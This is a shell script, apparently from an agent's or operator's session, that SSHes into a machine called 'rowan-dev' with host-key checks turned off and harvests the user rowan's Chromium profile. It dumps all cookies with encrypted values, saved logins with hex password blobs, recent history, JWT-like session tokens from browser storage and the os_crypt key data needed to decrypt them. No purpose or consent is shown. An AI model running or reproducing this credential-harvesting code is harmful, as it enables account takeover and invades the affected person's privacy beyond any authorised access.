set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
$S 'bash -s' <<'INNER'
set +e
C=/home/rowan/.config/chromium/Default
echo "######## ls"
ls -la $C 2>/dev/null | head -50
echo "######## Cookies tables"
python3 - <<'PY'
import sqlite3,glob,os,json,binascii
p='/home/rowan/.config/chromium/Default/Cookies'
print('exists',os.path.exists(p), os.path.getsize(p) if os.path.exists(p) else '')
try:
    con=sqlite3.connect('file:'+p+'?mode=ro',uri=True)
    for row in con.execute("select host_key,name,value,hex(encrypted_value),expires_utc,is_secure,is_httponly from cookies"):
        print(row)
except Exception as e: print('ERR',e)
PY
echo "######## History keplerops urls"
python3 - <<'PY'
import sqlite3,os
p='/home/rowan/.config/chromium/Default/History'
print('exists',os.path.exists(p))
try:
    con=sqlite3.connect('file:'+p+'?mode=ro',uri=True)
    for row in con.execute("select url,title,visit_count from urls order by last_visit_time desc limit 80"):
        print(row)
except Exception as e: print('ERR',e)
PY
echo "######## Login Data"
python3 - <<'PY'
import sqlite3,os
p='/home/rowan/.config/chromium/Default/Login Data'
print('exists',os.path.exists(p))
try:
    con=sqlite3.connect('file:'+p+'?mode=ro',uri=True)
    for row in con.execute("select origin_url,username_value,length(password_value),hex(password_value) from logins"):
        print(row)
except Exception as e: print('ERR',e)
PY
echo "######## leveldb strings for tokens"
for d in "$C/Local Storage/leveldb" "$C/Session Storage" "$C/IndexedDB" "$C/WebStorage"; do
  echo "--- $d"
  [ -d "$d" ] && grep -raoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' "$d" 2>/dev/null | sort -u | head -10
  [ -d "$d" ] && grep -raioE '(session|token|support|assistant)[^"\\ ]{0,60}' "$d" 2>/dev/null | sort -u | head -30
done
echo "######## Local State os_crypt"
python3 - <<'PY'
import json,os
p='/home/rowan/.config/chromium/Local State'
print(os.path.exists(p))
if os.path.exists(p):
    d=json.load(open(p))
    print(json.dumps(d.get('os_crypt',{}))[:500])
PY
echo "######## grep whole profile for keplerops/session quickly"
grep -raioE 'https?://[a-z.]*keplerops[a-z./:-]*' $C 2>/dev/null | sort -u | head -40
INNER
echo DONE_MARK_$RANDOM
